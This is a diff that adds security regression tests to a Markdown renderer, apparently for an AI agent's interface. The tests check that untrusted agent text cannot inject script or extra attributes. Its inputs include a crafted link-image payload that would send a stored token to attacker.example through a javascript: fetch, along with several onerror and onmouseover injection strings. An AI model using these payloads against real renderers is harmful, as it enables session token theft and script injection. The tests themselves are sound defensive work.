@@ -100,4 +100,78 @@ describe("Markdown", () => {
       expect(container.textContent).toContain(" b");
     }
   });
+
+  // Agent text is untrusted (a repository or a web page can steer it). These
+  // came with the fix for GHSA-756p-frh7-w9cw in the old renderer.
+  describe("untrusted text", () => {
+    const allowed: Record<string, string[]> = {
+      a: ["href", "target", "rel"],
+      img: ["src", "alt", "class", "loading"],
+    };
+    // Every element is one the renderer makes, with only its own attributes,
+    // and a link goes to a web address with nothing of the renderer's in it.
+    // React escapes quotes in attributes, so unlike the old test a quote in an
+    // address is allowed.
+    const assertSafe = (container: HTMLElement) => {
+      for (const el of container.querySelectorAll("*")) {
+        const tag = el.tagName.toLowerCase();
+        for (const a of el.getAttributeNames()) expect(allowed[tag] ?? ["class", "aria-label", "type"], `<${tag}> got ${a}=`).toContain(a);
+        if (tag === "a") expect(el.getAttribute("href")).toMatch(/^https?:\/\/[^\s<\u0000-\u0003]*$/);
+      }
+    };
+    const draw = (src: string) => render(<Markdown src={src} />).container;
+
+    it("keeps an image inside a link's address out of the link", () => {
+      const c = draw(
+        '[Open the build log](https://example.com/![javascript:fetch("https://attacker.example/?t="+localStorage.getItem("arakun.token"))](/onpointerdown=location=this.attributes.alt.value//))',
+      );
+      assertSafe(c);
+      expect(c.querySelector("a")).toBeNull();
+      const img = c.querySelector("img")!;
+      expect(img.getAttribute("src")).toBe("/onpointerdown=location=this.attributes.alt.value//");
+      expect(img.getAttribute("alt")).toMatch(/^javascript:fetch\("/);
+    });
+    it("keeps code inside a link's address out of the href", () => {
+      const c = draw("[log](https://example.com/`x`)");
+      assertSafe(c);
+      expect(c.querySelector("a")).toBeNull();
+      expect(c.querySelector("code")?.textContent).toBe("x");
+    });
+    it("keeps bold inside a link's address out of the href", () => {
+      const c = draw("[x](https://e.com/**b**)");
+      assertSafe(c);
+      expect(c.querySelector("a")).toBeNull();
+      expect(c.querySelector("b")?.textContent).toBe("b");
+    });
+    it("does not let agent text bring its own placeholders", () => {
+      for (const forged of ["\u00010\u0001", "\u00009\u0000", "![a](/a.png) \u00010\u0001", "[x](https://e.com/\u00010\u0001)"]) {
+        const c = draw(forged);
+        assertSafe(c);
+        expect(c.textContent).not.toContain("undefined");
+        expect(c.querySelectorAll("img").length).toBeLessThanOrEqual(1);
+      }
+    });
+    it("still renders links, images and code", () => {
+      expect(html("[docs](https://arakun.dev/a?b=1&c=2)")).toBe('<p><a href="https://arakun.dev/a?b=1&amp;c=2" target="_blank" rel="noopener">docs</a></p>');
+      const img = draw("![plot](/image/p.png?sig=a&t=1)").querySelector("img.pic")!;
+      expect([img.getAttribute("src"), img.getAttribute("alt")]).toEqual(["/image/p.png?sig=a&t=1", "plot"]);
+      expect(html("run `a < b` now")).toBe("<p>run <code>a &lt; b</code> now</p>");
+      // A picture as the text of a link is still a picture in a link.
+      const linked = draw("[![logo](https://arakun.dev/l.png)](https://arakun.dev/)");
+      assertSafe(linked);
+      expect(linked.querySelector("a")?.getAttribute("href")).toBe("https://arakun.dev/");
+      expect(linked.querySelector("a > img.pic")?.getAttribute("src")).toBe("https://arakun.dev/l.png");
+    });
+    it("keeps attribute quotes in agent text as text", () => {
+      for (const src of [
+        '[x](https://e.com/"onmouseover="alert(1))',
+        '![x" onerror="alert(1)](/a.png)',
+        '![x](/a.png"onerror=alert(1))',
+        '**[x](https://e.com/**"**)**',
+        "<img src=x onerror=alert(1)>",
+      ]) {
+        assertSafe(draw(src));
+      }
+    });
+  });
 });
